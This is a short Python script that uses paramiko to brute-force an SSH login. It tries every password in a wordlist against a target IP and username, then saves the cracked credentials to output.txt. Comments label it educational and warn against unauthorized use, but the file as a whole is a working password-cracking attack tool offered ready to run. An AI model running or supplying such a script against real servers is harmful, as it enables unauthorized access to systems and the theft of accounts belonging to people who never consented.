
#a dictionary attack that crack ssh password
#please don't try this to real systems(only if you have premissions)
#this is for educational purposes only


#import the modules we will need!
import paramiko
import argparse
import datetime
import os
#if you dont have any of this modules go to terminal and run the command
#   $ python -m pip install <name_of_the_module>
#define the main function
def main():
    #set the paramiko client 
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #set the command line argument!
    parser = argparse.ArgumentParser()
    parser.add_argument("ip")#add an ip argument
    args = parser.parse_args()

    #some data we will need for this attack
    ip_address = args.ip
    port = 22
    user = "username"# change this
    wordlist = "mycustomwordlist.txt"# change this
    #start the dictionary attack!
    foundpassword = ""
    os.system("clear")# clear the screen
    with open(wordlist, "r") as passwords:#open the file
        for password1 in passwords:
           password1 = password1.strip("\n")
           print(f"connect to {ip_address} with {password1}")
           try: 
              #connect to ssh with the password
              ssh.connect(hostname = ip_address, port=port, username = user, password = password1)
              #if the password is correct then the command (echo 'password found :)) will be executed!
              stdin,stdout,stderr=ssh.exec_command("echo 'password found :)' ")
              print(stdout.readlines())
              foundpassword = password1
              print("results saved in output.txt")
              break #if the password is correct then there is no reason to keep the loop
           except paramiko.ssh_exception.AuthenticationException:
               #if the password is not correct then throw an message and keep the loop
               print("incorrect")
    #after the test the results will be in a output file txt
    with open("output.txt", "w") as results:
        datee = str(datetime.datetime.today())
        results.write(datee)
        info = f"\n ip: {ip_address}, username: {user}, password: {foundpassword}"
        results.write(info)
    ssh.close()

if __name__ == "__main__":
    main()#call the main function